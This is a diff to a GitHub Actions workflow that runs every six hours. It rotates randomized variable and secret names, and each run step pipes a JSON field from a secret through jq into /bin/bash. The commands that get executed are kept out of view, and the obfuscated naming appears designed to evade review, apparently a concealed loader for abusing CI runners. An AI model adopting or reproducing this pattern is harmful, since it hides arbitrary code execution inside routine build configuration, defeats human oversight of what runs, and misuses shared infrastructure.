@@ -2,24 +2,22 @@ name: guoqingpao3456
 on:
   workflow_dispatch:
   schedule:
-    - cron: '50 1/6 * * *'
+    - cron: '28 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: guoqingpao3456
         env:
-          bl52772: ${{ secrets.bl52772 }}
+          q41: ${{ secrets.q41 }}
         run: |
-          echo $bl52772 | jq -r .rm59159 | /bin/bash
-          echo $r32876 | jq -r .nzysz0469 | /bin/bash
-          echo $ntkn4 | jq -r .vrbyk745 | /bin/bash
-          echo $ro46823 | jq -r .zg456 | /bin/bash
-          echo $afsr587 | jq -r .sywnq0053 | /bin/bash
-          echo $mbjhz60427 | jq -r .ypxb8 | /bin/bash
-          echo $t4 | jq -r .gvbk2867 | /bin/bash
-          echo $tflom0953 | jq -r .rkmz526 | /bin/bash
-          echo $uj29 | jq -r .jmiry89562 | /bin/bash
+          echo $q41 | jq -r .kxlqu8152 | /bin/bash
+          echo $k42882 | jq -r .eut7329 | /bin/bash
+          echo $zfqbw48 | jq -r .tn79 | /bin/bash
+          echo $ef174 | jq -r .iceoq3245 | /bin/bash
+          echo $jena19051 | jq -r .bo6 | /bin/bash
+          echo $zx7 | jq -r .v3 | /bin/bash
+          echo $soa64742 | jq -r .ad7 | /bin/bash
+          echo $j76 | jq -r .icyur23797 | /bin/bash
 
